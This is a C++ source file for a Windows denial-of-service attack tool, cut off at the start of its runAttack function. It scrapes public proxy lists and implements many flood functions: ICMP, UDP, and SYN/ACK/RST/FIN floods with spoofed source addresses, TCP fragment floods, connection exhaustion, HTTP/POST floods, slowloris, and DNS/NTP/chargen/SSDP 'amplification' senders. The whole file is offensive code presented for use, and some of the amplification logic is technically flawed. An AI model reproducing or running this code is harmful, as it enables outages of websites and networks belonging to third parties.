#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <iomanip>
#include <map>
#include <queue>
#include <random>
#include <thread>
#include <chrono>
#include <mutex>
#include <atomic>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define BUFFER_SIZE 65536
#define MAX_THREADS 200

using namespace std;

struct Target {
    string ip;
    string host;
    int port;
    string path;
    int duration;
    int threads;
    string method;
    string spoof_ip;
    bool random_spoof;
    Target() : port(80), duration(10), threads(1), method("http"), random_spoof(false) {}
};

struct ProxyInfo {
    string host;
    int port;
    bool working;
    ProxyInfo() : port(0), working(false) {}
};

struct Stats {
    atomic<long long> packets;
    atomic<long long> bytes;
    atomic<long long> conns;
    atomic<bool> running;
    Stats() : packets(0), bytes(0), conns(0), running(false) {}
};

Target target;
Stats stats;
vector<ProxyInfo> proxyList;
ofstream logFile;
mutex logMutex;
mutex proxyMutex;
random_device rd;
mt19937 gen(rd());
uniform_int_distribution<> portDist(1, 65535);
uniform_int_distribution<> byteDist(0, 255);
uniform_int_distribution<> ipDist(1, 254);
int currentProxyIndex = 0;

vector<string> proxySources = {
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
};

void writeLog(const string& msg) {
    lock_guard<mutex> lock(logMutex);
    time_t now = time(nullptr);
    string t = ctime(&now);
    t.pop_back();
    logFile << "[" << t << "] " << msg << endl;
    logFile.flush();
}

void logInfo(const string& msg) {
    cout << "[*] " << msg << endl;
    writeLog("[INFO] " + msg);
}

void logSuccess(const string& msg) {
    cout << "[+] " << msg << endl;
    writeLog("[SUCCESS] " + msg);
}

void logError(const string& msg) {
    cout << "[-] " << msg << endl;
    writeLog("[ERROR] " + msg);
}

void logWarning(const string& msg) {
    cout << "[!] " << msg << endl;
    writeLog("[WARNING] " + msg);
}

bool resolveHost(const string& host, string& ip) {
    struct hostent* he = gethostbyname(host.c_str());
    if (!he) return false;
    struct in_addr addr;
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    ip = inet_ntoa(addr);
    return true;
}

string randomIP() {
    return to_string(ipDist(gen)) + "." + to_string(ipDist(gen)) + "." +
        to_string(ipDist(gen)) + "." + to_string(ipDist(gen));
}

string randomString(int len) {
    string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    string result;
    for (int i = 0; i < len; i++) {
        result += chars[rand() % chars.length()];
    }
    return result;
}

unsigned short in_cksum(unsigned short* addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short* w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

ProxyInfo getProxy() {
    lock_guard<mutex> lock(proxyMutex);
    if (proxyList.empty()) return ProxyInfo();
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.size();
    return proxyList[currentProxyIndex];
}

string httpGet(const string& url) {
    string host, path;
    size_t start = 0;

    if (url.find("http://") == 0) start = 7;
    else if (url.find("https://") == 0) start = 8;

    size_t slash = url.find('/', start);
    if (slash != string::npos) {
        host = url.substr(start, slash - start);
        path = url.substr(slash);
    }
    else {
        host = url.substr(start);
        path = "/";
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return "";

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);

    string ip;
    if (!resolveHost(host, ip)) {
        closesocket(sock);
        return "";
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return "";
    }

    string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "User-Agent: Mozilla/5.0\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 50000) break;
    }

    closesocket(sock);

    size_t body_start = response.find("\r\n\r\n");
    if (body_start != string::npos) {
        return response.substr(body_start + 4);
    }

    return response;
}

void parseProxy(const string& content) {
    stringstream ss(content);
    string line;

    while (getline(ss, line)) {
        if (line.empty()) continue;

        ProxyInfo p;
        size_t colon = line.find(':');
        if (colon == string::npos) continue;

        p.host = line.substr(0, colon);

        size_t colon2 = line.find(':', colon + 1);
        if (colon2 != string::npos) {
            p.port = stoi(line.substr(colon + 1, colon2 - colon - 1));
        }
        else {
            size_t space = line.find(' ', colon + 1);
            if (space != string::npos) {
                p.port = stoi(line.substr(colon + 1, space - colon - 1));
            }
            else {
                p.port = stoi(line.substr(colon + 1));
            }
        }

        if (p.port > 0 && p.port < 65535) {
            proxyList.push_back(p);
        }
    }
}

void fetchProxies() {
    logInfo("Downloading proxy list");

    for (const string& src : proxySources) {
        string content = httpGet(src);
        if (!content.empty()) {
            parseProxy(content);
            logInfo("Got " + to_string(proxyList.size()) + " proxies");
        }
        this_thread::sleep_for(chrono::seconds(1));
    }

    logSuccess("Total proxies: " + to_string(proxyList.size()));
}

bool testProxy(ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy.port);

    string ip;
    if (!resolveHost(proxy.host, ip)) {
        closesocket(sock);
        return false;
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    string request = "GET http://httpbin.org/ip HTTP/1.1\r\n";
    request += "Host: httpbin.org\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 5000) break;
    }

    closesocket(sock);

    if (response.find(proxy.host) != string::npos) {
        proxy.working = true;
        return true;
    }

    return false;
}

void filterProxies() {
    logInfo("Testing " + to_string(proxyList.size()) + " proxies");

    vector<ProxyInfo> working;
    int tested = 0;

    for (ProxyInfo& p : proxyList) {
        tested++;
        cout << "\rTesting: " << tested << "/" << proxyList.size() << " - " << p.host << ":" << p.port << "   " << flush;

        if (testProxy(p)) {
            working.push_back(p);
            cout << endl;
            logSuccess("Working: " + p.host + ":" + to_string(p.port));
        }

        if (tested % 10 == 0) {
            this_thread::sleep_for(chrono::milliseconds(500));
        }
    }

    cout << endl;
    proxyList = working;
    logSuccess("Working proxies: " + to_string(proxyList.size()));
}

// ==================== LAYER 3 ATTACKS ====================

void icmpFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock == INVALID_SOCKET) {
        logError("ICMP flood requires admin privileges");
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct icmp {
        unsigned char type;
        unsigned char code;
        unsigned short checksum;
        unsigned short id;
        unsigned short seq;
    } *icmp_hdr = (struct icmp*)packet;

    icmp_hdr->type = 8;
    icmp_hdr->code = 0;
    icmp_hdr->id = GetCurrentProcessId();

    while (stats.running) {
        icmp_hdr->seq++;
        int size = 64 + (rand() % 928);

        for (int i = sizeof(struct icmp); i < size; i++) {
            packet[i] = byteDist(gen);
        }

        icmp_hdr->checksum = 0;
        icmp_hdr->checksum = in_cksum((unsigned short*)packet, size);

        sendto(sock, packet, size, 0, (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += size;

        this_thread::sleep_for(chrono::microseconds(50));
    }

    closesocket(sock);
}

void udpFlood() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char buffer[65507];
        int size = 64 + (rand() % 65000);
        for (int i = 0; i < size; i++) {
            buffer[i] = byteDist(gen);
        }

        sendto(sock, buffer, size, 0, (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += size;

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(10));
    }
}

void udpFragmentFlood() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        int frag = 1;
        int total = 10 + (rand() % 20);

        for (int f = 0; f < total && stats.running; f++) {
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target.port);
            addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

            char buffer[1500];
            int size = 100 + (rand() % 1400);
            for (int i = 0; i < size; i++) {
                buffer[i] = byteDist(gen);
            }

            sendto(sock, buffer, size, 0, (struct sockaddr*)&addr, sizeof(addr));
            stats.packets++;
            stats.bytes += size;
        }

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(100));
    }
}

// ==================== LAYER 4 ATTACKS ====================

void synFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        logError("SYN flood requires admin privileges");
        return;
    }

    while (stats.running) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(portDist(gen));
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char packet[4096];
        memset(packet, 0, sizeof(packet));

        struct ipheader {
            unsigned char ihl : 4, version : 4;
            unsigned char tos;
            unsigned short tot_len;
            unsigned short id;
            unsigned short frag_off;
            unsigned char ttl;
            unsigned char protocol;
            unsigned short check;
            unsigned int saddr;
            unsigned int daddr;
        } *ip = (struct ipheader*)packet;

        struct tcpheader {
            unsigned short source;
            unsigned short dest;
            unsigned int seq;
            unsigned int ack_seq;
            unsigned char doff : 4, res1 : 4;
            unsigned char fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1;
            unsigned short window;
            unsigned short check;
            unsigned short urg_ptr;
        } *tcp = (struct tcpheader*)(packet + sizeof(struct ipheader));

        ip->version = 4;
        ip->ihl = 5;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;

        if (target.random_spoof) {
            ip->saddr = inet_addr(randomIP().c_str());
        }
        else if (!target.spoof_ip.empty()) {
            ip->saddr = inet_addr(target.spoof_ip.c_str());
        }
        else {
            ip->saddr = inet_addr(("192.168." + to_string(rand() % 255) + "." + to_string(rand() % 255)).c_str());
        }

        ip->daddr = inet_addr(target.ip.c_str());
        ip->tot_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        tcp->source = htons(portDist(gen));
        tcp->dest = htons(target.port);
        tcp->seq = rand();
        tcp->syn = 1;
        tcp->doff = 5;
        tcp->window = htons(65535);

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(struct ipheader) + sizeof(struct tcpheader);

        this_thread::sleep_for(chrono::microseconds(1));
    }

    closesocket(sock);
}

void ackFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        logError("ACK flood requires admin privileges");
        return;
    }

    while (stats.running) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char packet[4096];
        memset(packet, 0, sizeof(packet));

        struct ipheader {
            unsigned char ihl : 4, version : 4;
            unsigned char tos;
            unsigned short tot_len;
            unsigned short id;
            unsigned short frag_off;
            unsigned char ttl;
            unsigned char protocol;
            unsigned short check;
            unsigned int saddr;
            unsigned int daddr;
        } *ip = (struct ipheader*)packet;

        struct tcpheader {
            unsigned short source;
            unsigned short dest;
            unsigned int seq;
            unsigned int ack_seq;
            unsigned char doff : 4, res1 : 4;
            unsigned char fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1;
            unsigned short window;
            unsigned short check;
            unsigned short urg_ptr;
        } *tcp = (struct tcpheader*)(packet + sizeof(struct ipheader));

        ip->version = 4;
        ip->ihl = 5;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(randomIP().c_str());
        ip->daddr = inet_addr(target.ip.c_str());
        ip->tot_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        tcp->source = htons(portDist(gen));
        tcp->dest = htons(target.port);
        tcp->seq = rand();
        tcp->ack_seq = rand();
        tcp->ack = 1;
        tcp->doff = 5;
        tcp->window = htons(65535);

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(struct ipheader) + sizeof(struct tcpheader);

        this_thread::sleep_for(chrono::microseconds(1));
    }

    closesocket(sock);
}

void rstFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        logError("RST flood requires admin privileges");
        return;
    }

    while (stats.running) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char packet[4096];
        memset(packet, 0, sizeof(packet));

        struct ipheader {
            unsigned char ihl : 4, version : 4;
            unsigned char tos;
            unsigned short tot_len;
            unsigned short id;
            unsigned short frag_off;
            unsigned char ttl;
            unsigned char protocol;
            unsigned short check;
            unsigned int saddr;
            unsigned int daddr;
        } *ip = (struct ipheader*)packet;

        struct tcpheader {
            unsigned short source;
            unsigned short dest;
            unsigned int seq;
            unsigned int ack_seq;
            unsigned char doff : 4, res1 : 4;
            unsigned char fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1;
            unsigned short window;
            unsigned short check;
            unsigned short urg_ptr;
        } *tcp = (struct tcpheader*)(packet + sizeof(struct ipheader));

        ip->version = 4;
        ip->ihl = 5;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(randomIP().c_str());
        ip->daddr = inet_addr(target.ip.c_str());
        ip->tot_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        tcp->source = htons(portDist(gen));
        tcp->dest = htons(target.port);
        tcp->seq = rand();
        tcp->rst = 1;
        tcp->doff = 5;
        tcp->window = htons(65535);

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(struct ipheader) + sizeof(struct tcpheader);

        this_thread::sleep_for(chrono::microseconds(1));
    }

    closesocket(sock);
}

void finFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        logError("FIN flood requires admin privileges");
        return;
    }

    while (stats.running) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char packet[4096];
        memset(packet, 0, sizeof(packet));

        struct ipheader {
            unsigned char ihl : 4, version : 4;
            unsigned char tos;
            unsigned short tot_len;
            unsigned short id;
            unsigned short frag_off;
            unsigned char ttl;
            unsigned char protocol;
            unsigned short check;
            unsigned int saddr;
            unsigned int daddr;
        } *ip = (struct ipheader*)packet;

        struct tcpheader {
            unsigned short source;
            unsigned short dest;
            unsigned int seq;
            unsigned int ack_seq;
            unsigned char doff : 4, res1 : 4;
            unsigned char fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1;
            unsigned short window;
            unsigned short check;
            unsigned short urg_ptr;
        } *tcp = (struct tcpheader*)(packet + sizeof(struct ipheader));

        ip->version = 4;
        ip->ihl = 5;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(randomIP().c_str());
        ip->daddr = inet_addr(target.ip.c_str());
        ip->tot_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        tcp->source = htons(portDist(gen));
        tcp->dest = htons(target.port);
        tcp->seq = rand();
        tcp->fin = 1;
        tcp->doff = 5;
        tcp->window = htons(65535);

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(struct ipheader) + sizeof(struct tcpheader);

        this_thread::sleep_for(chrono::microseconds(1));
    }

    closesocket(sock);
}

void tcpFragmentFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        logError("TCP fragment flood requires admin privileges");
        return;
    }

    while (stats.running) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        int fragments = 5 + (rand() % 20);
        int ip_id = rand() % 65535;

        for (int f = 0; f < fragments && stats.running; f++) {
            char packet[4096];
            memset(packet, 0, sizeof(packet));

            struct ipheader {
                unsigned char ihl : 4, version : 4;
                unsigned char tos;
                unsigned short tot_len;
                unsigned short id;
                unsigned short frag_off;
                unsigned char ttl;
                unsigned char protocol;
                unsigned short check;
                unsigned int saddr;
                unsigned int daddr;
            } *ip = (struct ipheader*)packet;

            ip->version = 4;
            ip->ihl = 5;
            ip->ttl = 255;
            ip->protocol = IPPROTO_TCP;
            ip->id = htons(ip_id);
            ip->saddr = inet_addr(randomIP().c_str());
            ip->daddr = inet_addr(target.ip.c_str());

            if (f < fragments - 1) {
                ip->frag_off = htons(f * 8 + 0x2000);
                ip->tot_len = htons(200);
            }
            else {
                ip->frag_off = htons(0);
                ip->tot_len = htons(100);
            }

            sendto(sock, packet, ntohs(ip->tot_len), 0,
                (struct sockaddr*)&addr, sizeof(addr));

            stats.packets++;
            stats.bytes += ntohs(ip->tot_len);
        }

        this_thread::sleep_for(chrono::microseconds(10));
    }

    closesocket(sock);
}

void tcpFlood() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        connect(sock, (struct sockaddr*)&addr, sizeof(addr));

        stats.conns++;
        stats.packets++;

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(100));
    }
}

void tcpSockStress() {
    vector<SOCKET> sockets;

    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            sockets.push_back(sock);
            stats.conns++;
            stats.packets++;
        }
        else {
            closesocket(sock);
        }

        if (sockets.size() > 10000) {
            for (auto& s : sockets) {
                closesocket(s);
            }
            sockets.clear();
        }

        this_thread::sleep_for(chrono::microseconds(10));
    }

    for (auto& s : sockets) {
        closesocket(s);
    }
}

// ==================== LAYER 7 ATTACKS ====================

void httpFlood() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            string path = target.path.empty() ? "/" : target.path;
            string agent = randomString(rand() % 20 + 10);
            string random_param = "?" + randomString(8) + "=" + randomString(8);

            string request = "GET " + path + random_param + " HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: " + agent + "\r\n";
            request += "Accept: */*\r\n";
            request += "Accept-Language: en-US,en;q=0.9\r\n";
            request += "Cache-Control: no-cache\r\n";
            request += "Connection: close\r\n";
            request += "\r\n";

            send(sock, request.c_str(), request.length(), 0);

            stats.conns++;
            stats.packets++;
            stats.bytes += request.length();
        }

        closesocket(sock);
        this_thread::sleep_for(chrono::milliseconds(1));
    }
}

void httpsFlood() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(443);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            string path = target.path.empty() ? "/" : target.path;

            string request = "GET " + path + " HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: Mozilla/5.0\r\n";
            request += "Accept: */*\r\n";
            request += "Connection: close\r\n";
            request += "\r\n";

            send(sock, request.c_str(), request.length(), 0);

            stats.conns++;
            stats.packets++;
            stats.bytes += request.length();
        }

        closesocket(sock);
        this_thread::sleep_for(chrono::milliseconds(10));
    }
}

void slowloris() {
    vector<pair<SOCKET, time_t>> sockets;

    for (int i = 0; i < target.threads && stats.running; i++) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            string request = "GET / HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: " + randomString(15) + "\r\n";

            send(sock, request.c_str(), request.length(), 0);
            sockets.push_back({ sock, time(nullptr) });
            stats.conns++;
        }
    }

    while (stats.running) {
        for (auto& p : sockets) {
            string header = "X-Header-" + randomString(5) + ": " + randomString(rand() % 200 + 10) + "\r\n";
            send(p.first, header.c_str(), header.length(), 0);
            stats.packets++;
            stats.bytes += header.length();
        }
        this_thread::sleep_for(chrono::seconds(5));
    }

    for (auto& p : sockets) {
        closesocket(p.first);
    }
}

void slowBody() {
    vector<SOCKET> sockets;

    for (int i = 0; i < target.threads && stats.running; i++) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            string request = "POST / HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: Mozilla/5.0\r\n";
            request += "Content-Length: 10000\r\n";
            request += "\r\n";

            send(sock, request.c_str(), request.length(), 0);
            sockets.push_back(sock);
            stats.conns++;
        }
    }

    while (stats.running) {
        for (auto& sock : sockets) {
            char data[10] = { 0 };
            send(sock, data, 1, 0);
            stats.packets++;
            stats.bytes++;
        }
        this_thread::sleep_for(chrono::seconds(1));
    }

    for (auto& sock : sockets) {
        closesocket(sock);
    }
}

void postFlood() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            string path = target.path.empty() ? "/" : target.path;
            string post_data = randomString(rand() % 500 + 100);

            string request = "POST " + path + " HTTP/1.1\r\n";
            request += "Host: " + target.host + "\r\n";
            request += "User-Agent: " + randomString(15) + "\r\n";
            request += "Content-Type: application/x-www-form-urlencoded\r\n";
            request += "Content-Length: " + to_string(post_data.length()) + "\r\n";
            request += "Connection: close\r\n";
            request += "\r\n";
            request += post_data;

            send(sock, request.c_str(), request.length(), 0);

            stats.conns++;
            stats.packets++;
            stats.bytes += request.length();
        }

        closesocket(sock);
        this_thread::sleep_for(chrono::milliseconds(1));
    }
}

void dnsAmplification() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(53);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char dns_query[] = {
            0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
            0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
            0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
        };

        sendto(sock, (char*)dns_query, sizeof(dns_query), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(dns_query);

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(50));
    }
}

void ntpAmplification() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(123);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char ntp_monlist[] = {
            0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00
        };

        sendto(sock, ntp_monlist, sizeof(ntp_monlist), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(ntp_monlist);

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(50));
    }
}

void chargenAmplification() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(19);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        char packet[1024];
        for (int i = 0; i < sizeof(packet); i++) {
            packet[i] = byteDist(gen);
        }

        sendto(sock, packet, sizeof(packet), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += sizeof(packet);

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(50));
    }
}

void ssdpAmplification() {
    while (stats.running) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(1900);
        addr.sin_addr.s_addr = inet_addr(target.ip.c_str());

        string ssdp = "M-SEARCH * HTTP/1.1\r\n";
        ssdp += "HOST: 239.255.255.250:1900\r\n";
        ssdp += "MAN: \"ssdp:discover\"\r\n";
        ssdp += "MX: 2\r\n";
        ssdp += "ST: ssdp:all\r\n";
        ssdp += "\r\n";

        sendto(sock, ssdp.c_str(), ssdp.length(), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.packets++;
        stats.bytes += ssdp.length();

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(50));
    }
}

// ==================== STATS ====================

void showStats() {
    auto start = chrono::steady_clock::now();

    while (stats.running) {
        this_thread::sleep_for(chrono::seconds(1));

        auto now = chrono::steady_clock::now();
        auto elapsed = chrono::duration_cast<chrono::seconds>(now - start).count();

        double mbps = (stats.bytes * 8.0 / 1024 / 1024) / (elapsed + 1);

        cout << "\r[" << elapsed << "s] Pkt:" << stats.packets
            << " | MB:" << stats.bytes / 1024 / 1024
            << " | Mbps:" << fixed << setprecision(1) << mbps
            << " | Conn:" << stats.conns
            << " | Rate:" << stats.packets / (elapsed + 1) << "/s    " << flush;
    }
    cout << endl;
}

// ==================== MAIN ====================

void runAttack() {
